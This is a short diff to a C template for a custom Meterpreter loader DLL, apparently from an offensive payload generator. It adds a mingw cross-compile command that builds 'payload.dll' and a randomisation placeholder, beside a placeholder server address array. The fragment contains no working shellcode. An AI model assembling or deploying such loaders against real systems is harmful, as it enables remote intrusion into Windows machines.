@@ -1,4 +1,5 @@
 // C template | Author: Ast0Baby
+// Compile:: i686-w64-mingw32-gcc astrobaby.c -o payload.dll -lws2_32 -shared
 // https://astr0baby.wordpress.com/2014/02/12/custom-meterpreter-loader-dll/
 // ---
 
@@ -9,7 +10,7 @@
 #include <winsock2.h>
 #include <windows.h>
 
-
+// UUID-RANDOM
 
 unsigned char server[]=
 "IpADr3";
